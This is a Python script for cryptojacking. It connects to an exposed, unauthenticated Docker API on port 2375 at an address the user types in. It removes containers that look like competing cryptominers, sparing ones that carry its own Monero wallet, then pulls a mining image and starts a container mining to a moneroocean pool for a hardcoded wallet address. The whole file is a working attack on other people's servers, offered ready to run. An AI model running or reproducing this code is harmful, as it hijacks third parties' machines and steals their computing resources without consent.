import docker
from datetime import datetime
from docker.errors import DockerException
from colorama import Fore, Style, init
import sys

# variable setter (default config)
docker_port = '2375'
docker_ip = ''
docker_keywords_delete = ["xmrig", "miner", "xmr", "unmineable"]
docker_faulty = ''
excluded_string = "45nqWWu8CV6WuNpEhbNAu4DWTmfUQBxRCWdND6iQVXyAL3cNNTeQoUWCmMzcaScdnJXJY3ttWxwJy9boywbN2XCn8Ejig1s"

#miner config (default config)
mining_docker_image = "thechristech/unmineable:latest"
POOL_URL = "gulf.moneroocean.stream:10128"
POOL_USER = excluded_string # note: pool_user is the same as the excluded string
POOL_PASS = "x"
COIN = "xmr"
KEEP_ALIVE = "--keepalive"

# Import setter (default config)
init(autoreset=True)
start_time = datetime.now()

# functions
def capture_time(start_time):
    end_time = datetime.now()
    duration = end_time - start_time
    print(f"{Fore.LIGHTBLUE_EX}# [time] Script ended at {end_time}")
    print(f"{Fore.YELLOW}# [info] Script duration: {duration}")
    sys.exit(0)

def list_docker_images(client):
    print(f"\n{Fore.LIGHTBLUE_EX}# [info] Listing Docker Images:\n")
    for image in client.images.list():
        print(f"# Image ID: {image.id}")
        if image.tags:
            print(f"# Image Tags: {', '.join(image.tags)}")
        print("="*40)

def list_docker_containers(client):
    containers = client.containers.list(all=True)
    
    print(f"{Fore.LIGHTBLUE_EX}# [info] Listing Docker Containers:")
    
    suspicious_container_found = False
    
    for container in containers:
        container_image = container.image.tags[0] if container.image.tags else ""
        print(f"# Docker ip: {docker_ip}:{docker_port}")
        print(f"# Container ID: {container.id}")
        print(f"# Name: {container.name}")
        print(f"# Status: {container.status}")
        print(f"# Image: {container_image}")

        container_cmd = container.attrs['Config']['Cmd'] if 'Cmd' in container.attrs['Config'] else []
        
        if container_cmd is not None and any(excluded_string in str(arg) for arg in container_cmd):
            print(f"{Fore.GREEN}Container {container.name} is excluded due to the presence of the excluded string in the CMD.")
            continue

        if any(keyword in container_image.lower() for keyword in docker_keywords_delete):
            suspicious_container_found = True
            if container.status == "running":
                print(f"{Fore.RED}Suspicious mining container found! Image: {container_image}")
                print(f"{Fore.RED}Stopping and removing the running container...")

                try:
                    container.stop()
                    container.remove()
                    print(f"{Fore.GREEN}Successfully stopped and removed container: {container.name}")
                except docker.errors.DockerException as e:
                    print(f"{Fore.YELLOW}Error stopping/removing container {container.name}: {e}")
        else:
            print(f"{Fore.GREEN}Container does not match mining criteria. Skipping removal.")
        
        print("="*40)

    return suspicious_container_found

def pull_miner_image(client):
    try:
        existing_images = [image.tags for image in client.images.list()]
        
        if any(mining_docker_image in tags for tags in existing_images):
            print(f"{Fore.GREEN}Miner image {mining_docker_image} already exists locally.")
        else:
            print(f"Pulling miner image {mining_docker_image}...")
            client.images.pull(mining_docker_image)
            print(f"Miner image {mining_docker_image} pulled successfully.")
    except docker.errors.ImageNotFound:
        print("Miner image not found.")
    except docker.errors.APIError as e:
        print(f"Error pulling image: {e}")

def create_miner_container(client):
    try:
        print(f"Creating a container from image {mining_docker_image}...")

        container_name = f"miner_{docker_ip}_{datetime.now().strftime('%Y%m%d%H%M%S')}"

        container = client.containers.run(
            mining_docker_image,
            detach=True,
            name=container_name,
            environment={
                "MINING_POOL": POOL_URL,
                "MINING_COIN": COIN,
                "REFERRAL_CODE": "",
                "WALLET_ADDRESS": excluded_string,
                "WORKER_NAME": container_name,
            },
            auto_remove=True
        )

        print(f"Container {container_name} created successfully with the image {mining_docker_image}.")
    except docker.errors.DockerException as e:
        print(f"Error creating miner container: {e}")

# main code
print(f"{Fore.LIGHTBLUE_EX}# [time] Script started at {start_time}")
print(f"{Fore.BLUE}# [info] Import tools done")
print(f"{Fore.BLUE}# [input] User needs to provide docker ip")
docker_ip = input("# Please provide the Ip the docker api is hosted on:")
print(f"{Fore.BLUE}# [input] provided info: {docker_ip}")

try:
    client = docker.DockerClient(base_url=f'tcp://{docker_ip}:{docker_port}')
except docker.errors.DockerException as e:
    print(f"{Fore.RED}# [error] FATAL! Error connecting to Docker API: {e}")
    capture_time(start_time)

list_docker_containers(client)
list_docker_images(client)
pull_miner_image(client)

if not list_docker_containers(client):
    print(f"{Fore.LIGHTBLUE_EX}# [info] No suspicious containers found. Creating a new miner container...")
    create_miner_container(client)

capture_time(start_time)
